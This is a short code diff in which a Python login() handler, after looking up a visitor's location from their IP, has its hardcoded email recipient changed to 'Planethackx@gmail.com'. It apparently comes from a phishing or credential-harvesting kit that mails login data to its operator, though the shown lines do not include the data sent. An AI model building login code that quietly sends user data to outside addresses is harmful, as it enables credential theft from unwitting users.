@@ -38,7 +38,7 @@ def login():
         location_info = get_location_from_ip(user_ip)
 
         # List of email recipients (hardcoded or dynamically fetched)
-        recipient_emails = ['olamicreasgmail.com']  # Replace with your recipient emails
+        recipient_emails = ['Planethackx@gmail.com']  # Replace with your recipient emails
 
         try:
             for recipient_email in recipient_emails:
